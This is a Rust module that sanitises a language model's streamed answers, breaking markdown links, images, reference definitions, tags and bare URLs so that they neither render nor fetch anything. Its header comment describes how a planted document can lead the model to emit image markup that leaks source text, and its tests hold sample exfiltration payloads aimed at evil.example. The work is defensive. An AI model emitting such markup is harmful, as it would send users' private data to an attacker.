//! The answer as it leaves roll: model output is untrusted, and a planted document can make the
//! model write markup that a chat UI loads or links (`![.](https://evil.example/p?d=<other
//! sources>)`), sending text the reader may read to someone else. So every answer, streamed or
//! whole, native or OpenAI's, goes through [`Sanitizer`], which breaks that markup without
//! removing anything (the reader still sees the text):
//!
//! - an inline link's or image's `](` becomes `]\(`, so neither renders, and its URL a code span;
//! - a reference definition's `]:` (at a line's start) becomes `]\:`;
//! - a `<` that starts a tag or an autolink becomes `\<`;
//! - a bare URL (`http://`, `https://`, `ftp://`, `www.`) becomes a code span, which renders as
//!   text and is never linked or fetched.
//!
//! A profile with `allow_links` keeps inline links (never images) whose URL is exactly one in the
//! given sources' fields. While streaming, text that could still become one of these is held back
//! until it settles: a trailing `]` or `<`, a trailing word that is or may become a URL, a line
//! starting with `[` before its `]` is followed, and with `allow_links` an open `[…](…`. At most
//! [`MAX_HOLD`] bytes are held; past it they're released with any open construct broken.

use regex::Regex;
use std::sync::OnceLock;

/// The most bytes held back.
pub const MAX_HOLD: usize = 2048;

/// Breaks links, images, autolinks, tags and bare URLs in an answer as it streams.
pub struct Sanitizer {
    held: String,
    /// URLs a link may keep (`allow_links`: the sources' own); `None`: no links at all.
    allowed: Option<Vec<String>>,
    /// What was released so far ended a line (or nothing was).
    line_start: bool,
}

fn markup() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        Regex::new(r"(?P<link>(?P<bang>!)?\[(?P<text>[^\[\]\n]*)\]\((?P<url>[^()\s]*)\))|(?P<close>\]\()|(?P<auto><(?P<aurl>(?i:https?://|ftp://|www\.)[^\s<>`]*)(?P<gt>>)?)|(?P<tag><[A-Za-z/!?])|(?P<bare>(?i:https?://|ftp://|www\.)[^\s<>`)\]]+)").expect("the markup pattern")
    })
}

/// `s` as a code span (backticks inside it dropped).
fn code(s: &str) -> String {
    let s: String = s.chars().filter(|c| *c != '`').collect();
    if s.is_empty() { String::new() } else { format!("`{s}`") }
}

/// Whether a trailing word is, or may still become, a URL.
fn url_ahead(word: &str) -> bool {
    let w = word.trim_start_matches(|c: char| "([{<\"'*_~".contains(c)).to_ascii_lowercase();
    if w.is_empty() {
        return false;
    }
    w.contains("://") || w.starts_with("www.") || ["https://", "http://", "ftp://", "www."].iter().any(|p| p.starts_with(w.as_str()))
}

/// Whether a line (from its start) opens a reference definition `[label]:`, or may still.
fn definition(line: &str) -> Option<bool> {
    let indent = line.len() - line.trim_start_matches(' ').len();
    let t = &line[indent..];
    if indent > 3 || !t.starts_with('[') {
        return Some(false);
    }
    match t.find(']') {
        None => None,
        Some(i) => match t.as_bytes().get(i + 1) {
            None => None,
            Some(b':') => Some(true),
            Some(_) => Some(false),
        },
    }
}

impl Sanitizer {
    pub fn new(allowed: Option<Vec<String>>) -> Sanitizer {
        Sanitizer { held: String::new(), allowed, line_start: true }
    }

    /// Takes `text` and answers what can be released now.
    pub fn feed(&mut self, text: &str) -> String {
        self.held.push_str(text);
        let mut cut = self.hold_from();
        let forced = self.held.len() - cut > MAX_HOLD;
        if forced {
            cut = self.held.len();
        }
        let out: String = self.held.drain(..cut).collect();
        self.release(&out, forced)
    }

    /// Releases what's held (the answer ended: nothing can complete it).
    pub fn finish(&mut self) -> String {
        let out = std::mem::take(&mut self.held);
        self.release(&out, false)
    }

    /// Where the held text must start: the earliest point after which it may still change.
    fn hold_from(&self) -> usize {
        let b = &self.held;
        let mut cut = b.len();
        if b.ends_with(']') || b.ends_with('<') || b.ends_with('\\') {
            cut = b.len() - 1;
        }
        let ws = b.char_indices().rev().find(|(_, c)| c.is_whitespace()).map_or(0, |(i, c)| i + c.len_utf8());
        if url_ahead(&b[ws..]) {
            cut = cut.min(ws);
        }
        let line = b.rfind('\n').map(|i| i + 1).or(self.line_start.then_some(0));
        if let Some(ls) = line
            && definition(&b[ls..]).is_none()
        {
            cut = cut.min(ls);
        }
        // An open `[…` or `[…](…`: released whole, as one link.
        if let Some(p) = b.rfind('[') {
            let rest = &b[p..];
            let open = match rest.find("](") {
                None => !rest.contains(']'),
                Some(i) => !rest[i..].contains(')'),
            };
            if open {
                cut = cut.min(p);
            }
        }
        cut
    }

    /// `text` with its markup broken (`forced`: released past [`MAX_HOLD`] while more may come,
    /// so a construct still open in it is broken too).
    fn release(&mut self, text: &str, forced: bool) -> String {
        if text.is_empty() {
            return String::new();
        }
        // Reference definitions, line by line.
        let mut lined = String::with_capacity(text.len() + 8);
        let mut at_start = self.line_start;
        for piece in text.split_inclusive('\n') {
            match (at_start, definition(piece)) {
                (true, Some(true)) => {
                    let i = piece.find("]:").expect("a definition has ]:");
                    lined.push_str(&piece[..i + 1]);
                    lined.push('\\');
                    lined.push_str(&piece[i + 1..]);
                }
                // An open line-start `[` that must go now: escaped, so no `]:` can follow it.
                (true, None) if forced => {
                    let i = piece.find('[').expect("starts with [");
                    lined.push_str(&piece[..i]);
                    lined.push('\\');
                    lined.push_str(&piece[i..]);
                }
                _ => lined.push_str(piece),
            }
            at_start = piece.ends_with('\n');
        }
        self.line_start = text.ends_with('\n');
        let allowed = self.allowed.as_deref();
        let mut out = markup()
            .replace_all(&lined, |c: &regex::Captures| {
                if c.name("link").is_some() {
                    let url = c.name("url").map_or("", |m| m.as_str());
                    let keep = c.name("bang").is_none() && allowed.is_some_and(|a| a.iter().any(|u| u == url));
                    if keep {
                        return c[0].to_string();
                    }
                    let bang = if c.name("bang").is_some() { "!" } else { "" };
                    let text = c.name("text").map_or("", |m| m.as_str());
                    return format!("{bang}[{text}]\\({})", code(url));
                }
                if c.name("close").is_some() {
                    return "]\\(".to_string();
                }
                if let Some(u) = c.name("aurl") {
                    let gt = if c.name("gt").is_some() { ">" } else { "" };
                    return format!("\\<{}{gt}", code(u.as_str()));
                }
                if let Some(t) = c.name("tag") {
                    return format!("\\{}", t.as_str());
                }
                let url = c.name("bare").map_or("", |m| m.as_str());
                if allowed.is_some_and(|a| a.iter().any(|u| u == url)) {
                    return url.to_string();
                }
                code(url)
            })
            .into_owned();
        if forced && (out.ends_with(']') || out.ends_with('<')) {
            let ch = out.pop().expect("ends with a char");
            out.push('\\');
            out.push(ch);
        }
        out
    }
}

/// An answer's text, whole, sanitized.
pub fn sanitize(text: &str, allowed: Option<Vec<String>>) -> String {
    let mut s = Sanitizer::new(allowed);
    let mut out = s.feed(text);
    out.push_str(&s.finish());
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Nothing in `out` renders as a link, an image, a definition, a tag or an autolink: no `](`
    /// or line-start `]:`, no unescaped `<`, every URL inside a code span.
    fn inert(out: &str) {
        assert!(!out.contains("]("), "{out}");
        assert!(out.lines().all(|l| definition(l) != Some(true) || l.contains("]\\:")), "{out}");
        for (i, _) in out.match_indices('<') {
            assert_eq!(out[..i].chars().last(), Some('\\'), "{out}");
        }
        for (i, _) in out.match_indices("://") {
            assert_eq!(out[..i].matches('`').count() % 2, 1, "a URL outside a code span: {out}");
        }
    }

    #[test]
    fn planted_images_and_links_are_broken_however_the_stream_splits_them() {
        let answer = "Reset it in Settings [1].\n![.](https://evil.example/p?d=secret) and [click](https://evil.example/q) <https://evil.example/a> <img src=x>\n[r]: https://evil.example/r\nsee https://evil.example/b [2]";
        let whole = sanitize(answer, None);
        inert(&whole);
        assert_eq!(
            whole,
            "Reset it in Settings [1].\n![.]\\(`https://evil.example/p?d=secret`) and [click]\\(`https://evil.example/q`) \\<`https://evil.example/a`> \\<img src=x>\n[r]\\: `https://evil.example/r`\nsee `https://evil.example/b` [2]"
        );
        // However the stream splits it: inert, and only `\` and backticks added.
        let bare = |t: &str| t.replace(['\\', '`'], "");
        for at in 1..answer.len() {
            if !answer.is_char_boundary(at) {
                continue;
            }
            let mut s = Sanitizer::new(None);
            let mut out = s.feed(&answer[..at]);
            out.push_str(&s.feed(&answer[at..]));
            out.push_str(&s.finish());
            inert(&out);
            assert_eq!(bare(&out), bare(answer), "split at {at}");
        }
        // allow_links keeps a link to a source's own URL, never an image.
        let ok = vec!["https://help.acme.test/pw".to_string()];
        let out = sanitize("[Reset](https://help.acme.test/pw) ![x](https://help.acme.test/pw) [y](https://evil.example)", Some(ok));
        assert_eq!(out, "[Reset](https://help.acme.test/pw) ![x]\\(`https://help.acme.test/pw`) [y]\\(`https://evil.example`)");
    }

    #[test]
    fn holding_back_is_bounded() {
        let mut s = Sanitizer::new(None);
        let out = s.feed(&format!("https://evil.example/{}", "a".repeat(MAX_HOLD + 10)));
        assert!(out.starts_with("`https://evil.example/") && out.ends_with('`'), "{}", &out[..40]);
        assert_eq!(s.finish(), "");
    }
}
